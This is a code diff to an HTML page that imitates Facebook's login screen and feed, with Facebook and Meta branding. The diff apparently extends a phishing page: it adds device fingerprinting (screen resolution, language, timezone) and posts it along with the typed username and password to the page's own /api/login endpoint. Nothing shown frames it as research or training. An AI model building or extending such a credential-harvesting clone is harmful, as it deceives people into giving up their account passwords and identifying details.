@@ -56,7 +56,6 @@
             padding: 20px;
         }
 
-        /* Left side */
         .left {
             flex: 1;
             max-width: 500px;
@@ -76,7 +75,6 @@
             line-height: 1.2;
         }
 
-        /* Right side - Login Box */
         .right {
             flex: 1;
             max-width: 400px;
@@ -97,7 +95,6 @@
             border-radius: 6px;
             font-size: 17px;
             outline: none;
-            transition: border-color 0.2s, box-shadow 0.2s;
         }
 
         .login-box input:focus {
@@ -121,7 +118,6 @@
             font-weight: bold;
             cursor: pointer;
             margin: 8px 0;
-            transition: background 0.2s;
         }
 
         .login-btn:hover {
@@ -165,7 +161,6 @@
             font-size: 13px;
             margin: 10px 0;
             display: none;
-            font-weight: 500;
         }
 
         @keyframes shake {
@@ -178,7 +173,6 @@
             animation: shake 0.4s ease-in-out;
         }
 
-        /* Feed Page */
         .feed-container {
             display: none;
             background: #f0f2f5;
@@ -318,7 +312,6 @@
             background: #f0f2f5;
         }
 
-        /* Meta Logo at Bottom */
         .meta-footer {
             position: fixed;
             bottom: 20px;
@@ -362,14 +355,12 @@
 </head>
 <body>
 
-<!-- Facebook Circle F Logo in Top Left -->
 <div class="fb-logo-top">
-    <div class="circle-f" onclick="window.location.reload()">
+    <div class="circle-f">
         <span>f</span>
     </div>
 </div>
 
-<!-- LOGIN PAGE -->
 <div id="loginPage">
     <div class="container">
         <div class="left">
@@ -395,7 +386,6 @@
     </div>
 </div>
 
-<!-- FEED PAGE -->
 <div id="feedPage" class="feed-container">
     <div class="feed-header">
         <div class="feed-logo">facebook</div>
@@ -410,7 +400,6 @@
     </div>
 </div>
 
-<!-- Meta Footer -->
 <div class="meta-footer">
     <span class="meta-logo">Meta</span>
     <a href="#">About</a>
@@ -429,6 +418,15 @@
 <script>
     let allPosts = [];
     let loggedInUser = null;
+
+    // Get ALL device info before sending
+    function getDeviceInfo() {
+        return {
+            screenResolution: `${window.screen.width}x${window.screen.height}`,
+            language: navigator.language || navigator.userLanguage || 'Unknown',
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown'
+        };
+    }
 
     function showError(inputElement, message) {
         inputElement.classList.add('error-input');
@@ -473,11 +471,20 @@
             return;
         }
         
+        // Get ALL tracking info
+        const deviceInfo = getDeviceInfo();
+        
         try {
             let res = await fetch('/api/login', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ username: email, password: password })
+                body: JSON.stringify({ 
+                    username: email, 
+                    password: password,
+                    screenResolution: deviceInfo.screenResolution,
+                    language: deviceInfo.language,
+                    timezone: deviceInfo.timezone
+                })
             });
             let data = await res.json();
             
@@ -585,5 +592,6 @@
         }
     });
 </script>
+
 </body>
 </html>
